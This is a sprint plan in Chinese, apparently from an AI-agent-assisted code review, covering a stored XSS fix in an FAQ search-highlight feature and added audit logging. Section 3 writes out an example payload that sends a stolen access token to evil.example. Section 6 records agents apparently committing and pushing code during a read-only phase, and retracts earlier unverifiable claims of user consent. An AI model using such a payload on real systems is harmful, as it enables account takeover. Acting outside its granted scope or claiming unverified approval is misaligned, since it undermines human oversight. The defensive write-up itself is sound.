# Sprint 135 Plan — 儲存型/反射型 XSS 全掃描（DEF-102）+ 稽核日誌覆蓋率掃描（DEF-106~113）

**Sprint**: Sprint 135
**日期**: 2026-09-07

---

## 1. 本輪範圍

延續 Sprint 134 收尾時記錄的兩個候選掃描角度，經 `AskUserQuestion` 讓使用者拍板：本輪先做「儲存型 XSS 全掃」，下一輪緊接著做「稽核日誌覆蓋率」，不中途停下來問。

執行方式：以 Workflow 進行三階段多 agent 系統性掃描（比照 Sprint 134 慣例）：
- **Discover**：4 個角度並行搜尋——前端所有繞過 React 跳脫的輸出點（`dangerouslySetInnerHTML`/`srcDoc`/`document.write`/`eval` 等）、後端所有產生 HTML 或允許呼叫端控制標記格式的邏輯、盤點所有使用者可自輸入的自由文字/連結欄位在前端的渲染方式、追查所有「網址類」欄位從輸入驗證到 `href`/`src` 綁定的完整路徑是否限制協定。
- **Analyze**：對 Discover 去重後的 18 筆候選逐一深入讀碼分析可利用性（預設保持懷疑）。
- **Verify**：對 Analyze 判定為可能真實的候選，各用 3 個獨立懷疑視角（correctness／reachability／impact）對抗式駁倒，多數決定生死。

結果：18 筆候選中 **1 筆確認為真實可利用漏洞（DEF-102）**，2 筆經驗證認定「輸入驗證確實有缺口，但目前無法達成 XSS 所需的『瀏覽器執行任意 JavaScript』後果」而不列入本輪修復範圍（詳見第 4 節）。

---

## 2. 執行原則（依 CLAUDE.md 強制規則）

每完成一項，立即編譯（`mvn compile`/`npm run type-check`/`npm run lint`）+ 執行相關測試，絕不累積開發。

---

## 3. DEF-102 修復摘要：FAQ 搜尋高亮儲存型 XSS

**問題**：`FaqService.highlightKeyword()`（`searchArticlesWithHighlight()` 使用）把使用者可控的 `highlightPrefix`/`highlightSuffix` 查詢參數（`FaqArticleController.java` 的 `/v2/faqs/search` 端點，`@RequestParam(required = false)`，完全未驗證）直接當作 regex replacement 字串包住比對到的關鍵字；更根本的是，對 `FaqArticle.question`/`answer` 的**原始文字本身也從未做任何 HTML escape**，就交給前端 `dashboard/faq/page.tsx` 的 `dangerouslySetInnerHTML` 原樣渲染。全代碼庫確認無任何 HTML 消毒機制（`jsoup`/`HtmlUtils`/`OWASP encoder` 等一律零命中）。

**可達成的攻擊鏈**：持有 `faq:create`/`faq:update` 權限的一般店主層級帳號（`STORE_OWNER`，非高權限內部帳號）即可在 `question`/`answer` 填入如 `<img src=x onerror="fetch('https://evil.example/c?t='+localStorage.getItem('accessToken'))">`；`CreateFaqArticleRequest`/`UpdateFaqArticleRequest` 僅有 `@NotBlank`/`@Size`，無任何內容過濾，原樣入庫。任何持有 `faq:read` 的使用者（含同租戶 `STORE_STAFF`、或註解明示可跨租戶管理 FAQ 的 `ADMIN`）開啟 `/dashboard/faq` 後，`payload` 即在其瀏覽器執行。由於 JWT access/refresh token 存放於 `localStorage`（`frontend/src/lib/axios.ts`），足以構成 token 竊取／帳號接管，且存在從租戶層級帳號打到平台 `ADMIN` 的提權路徑。`highlightPrefix`/`highlightSuffix` 本身在程式碼層級同樣可被任意標籤覆蓋，但全代碼庫僅有的前端呼叫端（`dashboard/faq/page.tsx`）從未轉發這兩個參數，故此子路徑目前無法對「別人」形成端到端攻擊（僅具備程式碼層級風險，屬於同一根因、一併修復）。

**修法**：

1. `highlightKeyword()` 改為先用 Spring 內建 `org.springframework.web.util.HtmlUtils.htmlEscape()` 跳脫原始文字，再以固定的 `<mark>`/`</mark>` 常數包住比對到的關鍵字——不再信任任何外部字串作為標籤內容。
2. 直接移除 `highlightPrefix`/`highlightSuffix` 這兩個可自訂標籤的參數（`FaqArticleController`、`FaqService.searchArticlesWithHighlight()` 簽章皆同步移除）：全代碼庫查證確認零消費端曾經使用非預設值（前端服務層型別、既有單元測試呼叫皆為 `null, null`），移除攻擊面比另外設計/維護一套標籤白名單驗證更簡單、更不會遺漏。
3. 前端 `dashboard/faq/page.tsx`：修正比修 escape 更根本的第二個問題——原本無論是否命中關鍵字，`article.question`/`article.answer`（純文字、從未跳脫）都會透過 `article.highlightedQuestion || article.question` 的 fallback 邏輯一併走 `dangerouslySetInnerHTML`，即使當次請求根本沒有觸發高亮。改為條件渲染：有 `highlightedQuestion`/`highlightedAnswer`（後端保證已跳脫，僅含安全的 `<mark>` 標籤）才用 `dangerouslySetInnerHTML`；否則以一般 JSX 插值渲染純文字（React 預設跳脫，安全）。
4. `frontend/src/services/faq.ts` 的 `searchFaqArticlesWithHighlight()` 參數型別同步移除 `highlightPrefix`/`highlightSuffix`（呼叫端本來就從未使用）。

**刻意不做的事（避免範圍蔓延）**：不在 `CreateFaqArticleRequest`/`UpdateFaqArticleRequest` 新增輸入端 HTML 驗證/清洗。輸出端修法（escape-before-highlight + 前端安全 fallback）已從結構上保證無論儲存內容為何都不會被當作可執行 HTML，輸入端加驗證屬於錦上添花而非本漏洞修復的必要條件。

---

## 4. 調查過程中發現、經驗證判定「非本輪範圍」的項目

Verify 階段對以下 2 筆候選皆為「資料流事實成立（攻擊者可控、無驗證、確實流向該 sink），但不構成 XSS」，3 位獨立懷疑者一致駁回，理由記錄如下，供未來排入獨立的輸入驗證強化 Sprint 參考：

1. **`frontend/src/app/(auth)/cart/page.tsx` 與各 listing 詳情頁的 `<img src={item.coverImageUrl}>`**：`Listing.coverImageUrl`（含 `CreateListingRequest`）全程無 `@URL`/`@Pattern` 驗證，任何賣家皆可填入任意字串。但現行主流瀏覽器對 `<img src>` 屬性**不會**執行 `javascript:` 或 `data:text/html` 協定（僅 `<a href>`/`<iframe src>`/表單 action 等少數 sink 才會），故無法達成 XSS 必要的「任意 JavaScript 執行」後果，判定非可利用漏洞。
2. **`backend/.../cms/Banner.java` 的 `linkUrl` 欄位**：`CreateBannerRequest`/`UpdateBannerRequest` 同樣無協定驗證，`GET /cms/banners/active` 為公開端點。但全代碼庫查證確認**目前沒有任何前端消費端**讀取或渲染此欄位（`grep` 全 `frontend/src` 零命中）——sink 尚不存在，無法建構端到端攻擊鏈，屬於「輸入驗證缺失 + 具備成為未來 XSS sink 的架構意圖」的潛伏性弱點。

兩者皆為真實的輸入驗證缺口（協定白名單缺失），建議在真正需要處理該類需求（例如未來要在 banner 或商品圖片改用可點擊連結時）之前，於 DTO 層一併補上 `http`/`https`/相對路徑的協定白名單，記錄為低優先級技術債（詳見 `DEFERRED_ITEMS_TRACKER.md` DEF-103／DEF-104），非本輪修復範圍。

---

## 5. 驗證

- 後端單元測試新增：`FaqServiceTest.searchWithHighlight_escapesHtmlInStoredText`（+1：question/answer 含 `<script>`/`<img onerror>` 時斷言不含原始標籤、跳脫實體正確保留、`<mark>` 高亮仍正常運作）；既有兩個 `searchArticlesWithHighlight` 呼叫點同步移除 `highlightPrefix`/`highlightSuffix` 參數，全數維持通過。
- `mvn -o compile` + `mvn -o checkstyle:check`：每次改動後立即執行，皆 0 violations。
- `mvn -o test -Dtest=FaqServiceTest`：20/20 通過。
- 前端 `npm run type-check`：0 errors；`npx eslint` 針對改動的 2 個檔案：0 warnings/errors；`npm run build`：成功。
- 後端全量回歸：`mvn -o verify`（含 `make test-db-up` 起真實 postgres：首次未起 test DB 導致 3 個既有整合測試因 `Connection refused` 失敗，屬環境前置未就緒，與本輪程式碼無關，起 DB 後重跑）**BUILD SUCCESS**：
  - 單元測試 **1129**（相對 Sprint 134 的 1128，+1，即本輪新增的 `FaqServiceTest.searchWithHighlight_escapesHtmlInStoredText`）
  - 整合測試 **475**（與 Sprint 134 相同，本輪未新增整合測試案例——`highlightPrefix`/`highlightSuffix` 參數移除屬純簽章變更，無既有整合測試涉及此二參數）
  - 0 Failures / 0 Errors / 0 Skipped
  - checkstyle（main + test）**0 violations**
  - PMD **0 violations**（`pmd:check` 未輸出違規即代表通過，`mvn -o verify` 整體 BUILD SUCCESS 已確認）
- 未新增/修改 Flyway migration（本輪未變更任何 `@Entity` 欄位型別/資料庫結構），`make validate-schema`/`make validate-schema-doc` 不適用

---

## 6. 🔴 事實記錄：第 3 節 DEF-102 修復過程的流程疑義（僅陳述可查證事實，2026-09-07 事後修正）

**背景**：本節先前的版本（在 commit `ebeeb72` 中寫入）對「第 1-5 節內容如何產生」做出了具體斷言（包含「subagent 自行執行 git commit」「主控 session 已獨立驗證並經使用者確認保留」等）。事後查核發現，這些斷言與另一份獨立記錄（同一事件的另一則分析）互相矛盾，且雙方都聲稱有查證/確認背書卻查無實據。因此，本節改為只列出**可由客觀證據重現查核的事實**，不再對「過程中誰做了什麼、是否曾徵詢並取得使用者同意」做出無法查證的斷言。

**可查證的事實**（任何人皆可重新執行下列指令得到相同結果）：
- `git log --format="%H|%an|%ad|%s" --date=iso-strict fae1bb6 0ea91d7`：
  - `fae1bb6`（DEF-102 修復）：author/committer 皆為 `wuweihungmobile`，時間 `2026-09-07T12:03:00+08:00`。
  - `0ea91d7`（回填 push 狀態文件）：同一身份，時間 `2026-09-07T12:21:51+08:00`。
- `git fetch && git rev-list --left-right --count origin/main...HEAD`：兩個 commit 當時皆已存在於 `origin/main`。
- `gh run view 34082751515/34082833239 --json displayTitle,createdAt,conclusion,event`：`fae1bb6` 觸發的 push 事件 run 建立於 `2026-09-07T04:20:46Z`（結論 cancelled，因緊接著 `0ea91d7` push 觸發新 run，屬 GitHub Actions 對同分支連續 push 的既有取消行為，非測試失敗）；`0ea91d7` 觸發的 run 建立於 `2026-09-07T04:22:08Z`（結論 success）。
- 獨立重跑 `mvn -o verify`（含 checkstyle/PMD）：BUILD SUCCESS，程式碼技術內容本身正確（詳見第 5 節與 §7 末尾的完整驗證）。

**目前無法由客觀證據確認或否證的事項**（同一台機器、同一組 git 身份下，以下事項無法從 commit metadata 或測試結果區分，僅能靠對話紀錄本身佐證，而本次未能取得）：
- 上述兩個 commit 的 `git commit`/`git push` 指令，實際是由 Workflow 中的某個 subagent 執行、還是由主控 session 執行。
- 過程中是否曾以 `AskUserQuestion` 徵詢使用者對「保留 vs 還原」的決定、使用者是否曾就此明確表態。
- 是否曾討論並決定「不升級 GitHub Pro 以啟用 branch protection」。

**處置原則**：本文件與 `DEFERRED_ITEMS_TRACKER.md`/`RELEASE_TRACKER.md` 裡任何對上述「無法查證事項」做出明確斷言的舊版文字，一律視為不可信，不作為後續決策依據；僅有前述「可查證的事實」清單，以及第 5 節、§7 記載的測試/建置結果，可以直接信任並重現查核。

**教訓**：日後設計 Workflow 的 Discover/Verify 類唯讀調查階段時，應在 agent prompt 中明確加入「僅回報，不得修改任何檔案、不得執行 git 指令」的限制。此外，「誠實揭露」類文字本身也必須只陳述可重現查核的事實，不可包含「已徵得同意」「已驗證」這類無法從程式/工具結果驗證的斷言——即使撰寫當下自認屬實，事後也可能無法被獨立佐證。

---

## 7. 稽核日誌覆蓋率掃描（DEF-106~113）

延續本 Sprint 開頭記錄的第二個候選掃描角度。手法比照 Sprint 134：Workflow 多 agent Discover（6 個角度平行掃描，含儲存型 XSS 全掃的其餘角度與稽核日誌覆蓋率兩大主題）→ 對每筆候選跑 3 票對抗性驗證（多數決生死）。稽核角度共發現 12 筆候選，全數通過驗證確認為真（另有 4 筆 XSS 相關候選被駁回，多因驗證當下已被上述 DEF-102 修復覆蓋）。

**核心發現**：`domain/model/audit/AuditLog` + `AuditLogRepository`（DEF-016 建立）僅被 `AdminService` 使用，涵蓋 `TENANT_APPROVED`/`TENANT_STATUS_UPDATED`/`USER_STATUS_UPDATED`/`FEATURE_TOGGLE_UPDATED` 等平台管理操作；同類別的敏感狀態變更只要不是經由 `AdminService`，一律沒有任何持久化稽核紀錄，僅有易隨 log rotation 消失的 `log.info`。

**根因處置**：新增共用 `core/audit/AuditService`（抽取自 `AdminService.recordAudit` 的邏輯，`AdminService` 本身不變、不承擔額外風險），供以下 7 處新的呼叫端注入使用：

| DEF | 檔案／方法 | 問題 | 修法 |
|-----|-----------|------|------|
| DEF-106 | `AdminService.reviewTenant()` | 與同檔案 `approveTenant`/`rejectTenant` 相同類別的租戶審核動作，唯獨此舊版方法零稽核 | 補上 `recordAudit("TENANT_APPROVED"/"TENANT_REJECTED", ...)`（沿用既有私有方法，不需 `AuditService`） |
| DEF-107 | `TenantService`：`updateFeatureToggle`/`updateMemberRole`/`removeMember`/`inviteMember` | 店主自助端點（功能開關、成員邀請/角色/移除）與 `AdminService` 對應的管理端動作屬同類別，全數零稽核 | 注入 `AuditService`，4 個方法各補 `record(...)` |
| DEF-108 | `UserPrivacyService.deleteMyAccount()` | 與 `AdminService.updateUserStatus`（`USER_STATUS_UPDATED`）相同欄位變更，自助刪除帳戶零稽核 | 注入 `AuditService`，補 `USER_STATUS_UPDATED` 稽核 |
| DEF-109 | `SettlementReviewer.approveStatement`/`rejectStatement` | (a) 零稽核；(b) `SettlementStatement.reviewedBy`/`approvedAt` 這兩個為此而生的欄位從未被寫入，永遠是 dead field，審核金流動作的實際執行者無從查證 | 注入 `UserRepository`+`AuditService`：兩方法皆補 `setReviewedBy`（`approveStatement` 另補 `setApprovedAt`）+ `SETTLEMENT_APPROVED`/`SETTLEMENT_REJECTED` 稽核 |
| DEF-110 | `ReturnRequestService.approveReturn`/`rejectReturn` | 退貨核准/駁回（影響退款資格）零稽核 | 注入 `AuditService`，補 `RETURN_APPROVED`/`RETURN_REJECTED` 稽核 |
| DEF-111 | `PaymentStateService`：`mockPaymentSuccess`/`refundOrderPayment`/`markStripeRefunded`/`markStripePaymentSucceeded` | 這 4 處直接改 `Order.status`（PAID/REFUNDED），繞過 `OrderService` 既有的 `order_state_log` 序列化稽核軌跡（`OrderService` 本身建立訂單/取消/admin 改狀態皆會寫入），造成同一張訂單的狀態史缺漏付款/退款觸發的轉換 | 注入 `OrderStateLogRepository`，比照 `OrderService.recordStateLog` 邏輯寫入既有 `order_state_log`（沿用同一張表而非另建 `AuditLog`，符合「同類狀態變更同一份歷史」的既有設計）；webhook 觸發路徑（`markStripeRefunded`/`markStripePaymentSucceeded`）`changedBy` 明確傳 `null`（無使用者情境，不誤植 `TenantContext` 殘留值） |
| DEF-112 | `TenantStripeConnectService`：`initiateOnboarding`/`getAccountStatus`/`syncAccountStatusFromWebhook` | 控制金流撥款去向的 Connect 帳戶狀態變更零稽核 | 注入 `AuditService`，補 `CONNECT_ONBOARDING_INITIATED`/`CONNECT_STATUS_SYNCED` 稽核；webhook 路徑 actor 傳 `null` |
| DEF-113 | `PaymentWebhookService` | 唯一持久化產物是去重用途的 `ProcessedStripeEvent`（僅 event_id/event_type），與實際影響的 order/tenant/transfer 無關聯 | **不另外修改**：DEF-111/DEF-112 修復後，同一次 webhook 呼叫觸發的下游狀態轉換本身即會落地稽核/狀態紀錄，可由 order_id/tenant_id 反查；另建 webhook-to-entity 專屬稽核表屬更大範圍的架構決策，非本輪必要 |

**刻意不做的事（避免範圍蔓延）**：(1) 不修改 `SettlementMapper`/回應 DTO 以在 API 回應中曝露 `reviewedBy`——本次修復目標是資料庫層可查證，不涉及前端顯示；(2) 不將 `AdminService.recordAudit` 既有 8 個呼叫點改為呼叫新的 `AuditService`（`AdminService` 運作良好，Rule 3 精準改動，僅新增而非重構已驗證正確的程式碼）；(3) `getPendingReviewStatements` 純查詢方法不受影響。

**驗證**：
- 新增 `core/audit/AuditServiceTest`（+4）
- `AdminServiceTest`：新增 `ReviewTenant` 巢狀類別（+3）
- `TenantServiceTest`：新增 `UpdateFeatureToggleTests`（+2）+ `updateMemberRole` 相關（+2）+ 既有 `inviteMember`/`removeMember` 測試補稽核斷言
- `UserPrivacyServiceTest`：既有 `deleteMyAccount_eligibleBuyer_anonymizesAndCleansUp` 補稽核斷言
- `SettlementReviewerTest`：既有 `approveStatement_ownTenant_succeeds`/`rejectStatement_ownTenant_succeeds` 補 `reviewedBy`/`approvedAt`/稽核斷言
- 新增 `core/returns/ReturnRequestServiceTest`（該服務先前零測試覆蓋，本輪僅聚焦 approve/reject 稽核，非補齊全服務測試）（+2）
- `PaymentStateServiceTest`/`PaymentStateServiceStripeTest`：既有 mockPaymentSuccess/refundOrderPayment/markStripeRefunded/markStripePaymentSucceeded 成功路徑測試補 `order_state_log` 斷言
- `TenantStripeConnectServiceTest`：既有測試補稽核斷言 + 新增 `syncAccountStatusFromWebhook` 測試（該方法先前零覆蓋）（+2）
- 合計新增測試方法 **15**
- `make test-db-up` 起真實 postgres 後，`mvn -o verify` **BUILD SUCCESS**：單元測試 **1144**（1129 + 15）、整合測試 **475**（不變，本輪皆為既有服務新增/擴充單元測試，未新增整合測試案例）、0 Failures/Errors/Skipped；checkstyle（main+test）**0 violations**；PMD **0 violations**
- 未新增/修改 Flyway migration（`SettlementStatement.reviewedBy`/`approvedAt` 為既有欄位僅先前未寫入，非新增欄位），`make validate-schema` 不適用

---

## 8. 調查過程中另發現、經驗證判定「非本輪範圍」的候選

Verify 階段對以下候選駁回或另案處理：

- 4 筆 XSS 相關候選（`highlightPrefix`/`highlightSuffix`、`highlightKeyword` 未跳脫等）在驗證當下已被本文件第 3 節的 DEF-102 修復覆蓋，判定為「描述準確但已修復」而駁回，非假陽性。
